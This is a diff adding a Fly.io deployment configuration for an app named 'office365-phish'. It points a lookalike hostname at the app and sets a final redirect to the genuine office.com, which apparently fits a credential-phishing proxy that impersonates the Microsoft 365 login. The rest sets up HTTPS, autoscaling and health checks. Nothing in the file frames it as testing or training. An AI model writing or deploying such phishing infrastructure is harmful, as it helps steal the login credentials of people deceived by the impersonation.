@@ -1,0 +1,27 @@
+app = "office365-phish"
+
+[build]
+  dockerfile = "Dockerfile"
+
+[env]
+  HOSTNAME_ENV = "fly.office365-phish.com"
+  FINAL_URL = "https://www.office.com/?auth=2"
+
+[experimental]
+  auto_rolling = true
+
+[http_service]
+  internal_port = 8080
+  force_https = true
+  auto_stop_machines = true
+  auto_start_machines = true
+  min_machines_running = 0
+  processes = ["app"]
+
+  [[http_service.checks]]
+    grace_period = "5s"
+    interval = "30s"
+    method = "get"
+    path = "/"
+    protocol = "http"
+    timeout = "2s" 
